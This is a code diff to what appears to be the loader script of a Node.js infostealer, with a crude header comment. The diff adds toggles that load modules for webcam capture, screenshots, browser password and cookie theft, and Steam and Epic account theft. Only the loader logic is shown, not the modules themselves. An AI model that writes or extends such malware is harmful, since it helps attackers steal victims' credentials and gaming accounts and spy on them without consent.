@@ -1,9 +1,12 @@
 // suck my nuts, heres all the toggles
 let runOnStartupToggle = false; //TODO
-let sysInfoToggle = true;
-let webcamToggle = true;
-let browserPassToggle = true;
+let sysInfoToggle = true; //FUNCTIONAL
+let webcamToggle = true; //FUNCTIONAL
+let screenshotToggle = false; //VERIFY
+let browserPassToggle = true; //FUNCTIONAL
 let browserCookieToggle = false; //TODO
+let steamToggle = false; //VERIFY
+let epicToggle = false; //VERIFY
 
 // mutex generation for directory creation
 const fs = require('fs').promises;
@@ -29,11 +32,20 @@ fs.mkdir(DirectoryPath, { recursive: true })
         if (webcamToggle){
           require('./modules/webcam.js')
         }
+        if (screenshotToggle){
+          require('./modules/screenshots.js')
+        }
         if (browserPassToggle){
           require('./modules/browserpass.js')
         }
         if (browserCookieToggle){
           require('./modules/browsercookie.js')
+        }
+        if (steamToggle){
+          require('./modules/steam.js')
+        }
+        if (epicToggle){
+          require('./modules/epic.js')
         }
     })
     .catch((err) => {
